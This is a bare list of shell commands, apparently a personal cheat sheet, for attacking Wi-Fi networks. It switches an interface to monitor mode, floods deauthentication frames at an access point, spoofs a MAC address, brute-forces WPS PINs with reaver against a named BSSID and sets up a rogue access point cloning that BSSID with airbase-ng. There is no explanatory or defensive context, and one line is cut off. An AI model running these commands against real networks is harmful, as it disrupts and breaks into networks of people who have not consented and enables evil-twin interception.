airodump-ng wlan0
airmon-ng check wlan0
aireplay-ng -0 0 -a mac
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 u
macchanger eth0 -r

reaver -b 28:FF:3E:41:FD:94 -i wlan0 -vv
airbase-ng -a 28:FF:3E:41:FD:94 --essid "bobr" -c 11 wlan0
